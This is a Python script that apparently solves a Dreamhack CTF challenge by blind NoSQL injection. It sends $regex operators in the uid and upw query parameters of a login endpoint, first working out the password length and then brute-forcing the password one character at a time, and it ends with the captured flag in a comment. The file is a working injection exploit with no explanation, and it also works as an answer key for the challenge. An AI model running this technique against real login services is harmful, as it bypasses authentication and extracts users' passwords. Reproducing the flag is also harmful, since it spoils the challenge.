import requests as rq

PORT = 24259
url = f"http://host3.dreamhack.games:{PORT}/login?uid[$regex]=adm&upw[$regex]="

# get length of upw
result = rq.get(url)
print(result.text == "admin")

length = 1
while result.text == "admin":
    result = rq.get(url + ".{" + str(length) + "}")
    length += 1

decided_chars = 6
flag_length = length - decided_chars
print(length)

length = length - decided_chars
url += "^..."
while length:
    for c in "0123456789abcdefghijklmnopqrstuvwxyz":
        result = rq.get(url + c)
        if result.text == "admin":
            url += c
            length -= 1
            print(url, length)
            break
    else:
        print("wtf?")
        break

flag = "DH{" + url[-flag_length:] + "}"
print(flag)

result = rq.get(url + "}$")
print(result.text == "admin")
# DH{89e50fa6fafe2604e33c0ba05843d3df}